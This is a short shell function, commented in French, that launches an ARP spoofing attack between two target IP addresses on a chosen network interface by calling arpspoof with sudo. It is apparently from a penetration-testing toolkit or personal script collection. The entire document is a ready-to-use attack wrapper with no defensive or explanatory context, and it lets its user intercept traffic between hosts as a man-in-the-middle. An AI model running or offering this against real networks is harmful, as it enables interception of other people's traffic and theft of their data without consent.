# DESC: Lance une attaque ARP spoofing entre deux cibles
# USAGE: arp_spoof <interface> <ip_cible_1> <ip_cible_2>
arp_spoof() {
    local interface="$1"
    local ip_cible_1="$2"
    local ip_cible_2="$3"
    sudo arpspoof -i "$interface" -t "$ip_cible_1" "$ip_cible_2"
}
